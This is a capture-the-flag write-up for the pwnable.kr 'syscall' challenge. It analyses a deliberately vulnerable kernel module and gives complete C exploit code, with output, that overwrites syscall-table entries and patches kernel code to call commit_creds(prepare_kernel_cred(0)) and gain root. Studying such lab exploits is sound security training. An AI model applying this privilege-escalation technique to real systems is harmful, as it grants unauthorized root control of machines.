# Pwnable.kr syscall CTF Writeup

## Problem Description  
The code provided for the challenge is as follows:

```c
// adding a new system call : sys_upper

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/slab.h>
#include <linux/vmalloc.h>
#include <linux/mm.h>
#include <asm/unistd.h>
#include <asm/page.h>
#include <linux/syscalls.h>

#define SYS_CALL_TABLE		0x8000e348		// manually configure this address!!
#define NR_SYS_UNUSED		223

//Pointers to re-mapped writable pages
unsigned int** sct;

asmlinkage long sys_upper(char *in, char* out){
	int len = strlen(in);
	int i;
	for(i=0; i<len; i++){
		if(in[i]>=0x61 && in[i]<=0x7a){
			out[i] = in[i] - 0x20;
		}
		else{
			out[i] = in[i];
		}
	}
	return 0;
}

static int __init initmodule(void ){
	sct = (unsigned int**)SYS_CALL_TABLE;
	sct[NR_SYS_UNUSED] = sys_upper;
	printk("sys_upper(number : 223) is added\n");
	return 0;
}

static void __exit exitmodule(void ){
	return;
}

module_init( initmodule );
module_exit( exitmodule );
```

The `sys_upper` function is a syscall that gets two args - `in` (the address of the string) and `out` (the address of the result). The function turns any string to upper case.

## Analysis  
The vulnerability in this function is that there are no address checks in it, so we can write to the kernel memory by putting any address we want in `out`.  
Our goal is to gain kernel permissions in order to be able to read the flag. After some research, I found this article on DGW: https://www.digitalwhisper.co.il/files/Zines/0x6F/DW111-1-LinuxKernelPwn.pdf. In order to have root permissions, we need to use these two functions: `commit_creds(prepare_kernel_creds(0))`.

- `cred` - This is a struct in Linux that saves data of a specific process (for example uid, gid...). In the Linux kernel, it looks like this:
```c
struct cred {
	atomic_long_t	usage;
	kuid_t		uid;		/* real UID of the task */
	kgid_t		gid;		/* real GID of the task */
	kuid_t		suid;		/* saved UID of the task */
	kgid_t		sgid;		/* saved GID of the task */
	kuid_t		euid;		/* effective UID of the task */
	kgid_t		egid;		/* effective GID of the task */
	kuid_t		fsuid;		/* UID for VFS ops */
	kgid_t		fsgid;		/* GID for VFS ops */
	unsigned	securebits;	/* SUID-less security management */
	kernel_cap_t	cap_inheritable; /* caps our children can inherit */
	kernel_cap_t	cap_permitted;	/* caps we're permitted */
	kernel_cap_t	cap_effective;	/* caps we can actually use */
	kernel_cap_t	cap_bset;	/* capability bounding set */
	kernel_cap_t	cap_ambient;	/* Ambient capability set */
#ifdef CONFIG_KEYS
	unsigned char	jit_keyring;	/* default keyring to attach requested
					 * keys to */
	struct key	*session_keyring; /* keyring inherited over fork */
	struct key	*process_keyring; /* keyring private to this process */
	struct key	*thread_keyring; /* keyring private to this thread */
	struct key	*request_key_auth; /* assumed request_key authority */
#endif
#ifdef CONFIG_SECURITY
	void		*security;	/* LSM security */
#endif
	struct user_struct *user;	/* real user ID subscription */
	struct user_namespace *user_ns; /* user_ns the caps and keyrings are relative to. */
	struct ucounts *ucounts;
	struct group_info *group_info;	/* supplementary groups for euid/fsgid */
	/* RCU deletion */
	union {
		int non_rcu;			/* Can we skip RCU deletion? */
		struct rcu_head	rcu;		/* RCU deletion hook */
	};
} __randomize_layout;
```

This struct saves the current permissions of the process. We want to change this struct so it will have kernel permissions. To do so, we use these functions:

- `int commit_creds(struct cred *new)`  
  The `commit_creds` function is a Linux kernel internal function used to replace the current process's credentials (UID, GID, capabilities, etc.) with a new set of credentials. It's a key part of how privilege changes are performed inside the kernel, and it is often referenced in kernel exploits to gain root privileges.

- `struct cred *prepare_kernel_cred(struct task_struct *daemon)`  
  The function `prepare_kernel_cred()` is a Linux kernel internal function used to create a new set of kernel-mode credentials, usually as a first step before applying them with `commit_creds()`. If daemon is NULL (or 0), the kernel uses the current process (current) as the base for the new credentials.

When combining these two functions (`commit_creds(prepare_kernel_creds(0))`), the current process becomes root, and we can read the flag. The problem is that only the kernel has the permission to call these functions.

One more thing that is crucial for this CTF is that KASLR is disabled. So we can use the vulnerability in the `sys_upper` syscall in order to overwrite the syscall table. We can pick 2 syscalls and overwrite their address in the syscall table so when we call them, it will call the two functions we need (`commit_creds`, `prepare_kernel_creds`) with the right args. That way we will have permission to call these functions, because it runs by the kernel.

We want to pick 2 unpopular syscalls and also syscalls that take as many args as the functions we need (1). I chose the `time` (NR 201) and `alarm` (NR 37) syscalls.

I also checked what are the addresses of the two functions using these commands:

```bash
cat /proc/kallsyms | grep commit_creds
cat /proc/kallsyms | grep prepare_kernel_cred
```

This is what I found:  
- `commit_creds` - `0x8003f56c`  
- `prepare_kernel_creds` - `0x8003f924`

So what we need to do is simply call the `sys_upper` so `in` will be a string that contains the address of the function and `out` is the address of the syscall table and in the index of the syscall we want to overwrite. After that we just need to call: `syscall(201, syscall(37, 0))` and read the flag.

However, there is a catch! The address of `commit_creds` (`0x8003f56c`) contains the byte `\x6c`, which is a lowercase letter in ASCII. That means that the `sys_upper` syscall will change its value, and we will not call the right address. To fix this, I just filled the memory before that function with `NOP`s so it jumps to a lower address but will not execute anything until `commit_creds`. I did it using the `sys_upper` syscall, and put in `out` the address `0x8003f560` (because the byte `\x60` is no longer a lowercase letter in ASCII, so `sys_upper` will not change it).

After doing this, I called the `time` and `alarm` syscalls, got root privileges, and read the flag in `/root/flag`.

---

## Exploit Code

```c
#include <stdio.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <string.h>
#include <stdlib.h>

#define __NR_upper 223
#define __NR_alarm 37
#define __NR_time 201

#define SYS_CALL_TABLE 0x8000e348
#define COMMIT_CREDS 0x8003f560

int main() {
    /*
    char input[] = "hello world!";
    char output[100] = { 0 };

    long result = syscall(__NR_upper, input, output);

    if (result == 0) {
        printf("Original: %s\n", input);
        printf("Uppercase: %s\n", output);
    }
    else {
        perror("syscall failed");
    }
    */

    long result;

    // override alarm syscall to prepare_kernel_cred
    result = syscall(__NR_upper, "\x24\xf9\x03\x80", SYS_CALL_TABLE + (37 * 4));
    if (result == 0) {
        printf("Successfully overrode the alarm syscall\n");
    }
    else {
        perror("syscall failed\n");
    }

    // fill the 12 bytes before commit_creds with NOP to change its address
    result = syscall(__NR_upper, "\x01\x10\xa0\xe1\x01\x10\xa0\xe1\x01\x10\xa0\xe1", COMMIT_CREDS);
    if (result == 0) {
        printf("Successfully filled commit_creds with NOP\n");
    }
    else {
        perror("NOP filling failed\n");
    }
    
    // override time syscall to commit_creds
    result = syscall(__NR_upper, "\x60\xf5\x03\x80", SYS_CALL_TABLE + (201 * 4));
    if (result == 0) {
        printf("Successfully overrode the time syscall\n");
    }
    else {
        perror("syscall failed\n");
    }
    
    result = syscall(__NR_time, syscall(__NR_alarm, 0));
    if (result == 0) {
        printf("Successfully committed kernel creds!\n");
        printf("You should now have root privileges\n");

        char flag[128];
        FILE *fp = fopen("/root/flag", "r");
        if (fp == NULL)
        {
            perror("[-] Error while opening the flag file\n");
            return -1;
        }
        fgets(flag, 128, fp);
        printf("[+] Flag: %s", flag);
        fclose(fp);
    }
    else {
        perror("committing kernel creds failed\n");
    }
    
    return 0;
}

/*
/tmp/dalal $ ./exploit
Successfully overrode the alarm syscall
Successfully filled commit_creds with NOP
Successfully overrode the time syscall
Successfully committed kernel creds!
You should now have root privileges
[+] Flag: Must_san1tize_Us3r_p0int3r
*/
```
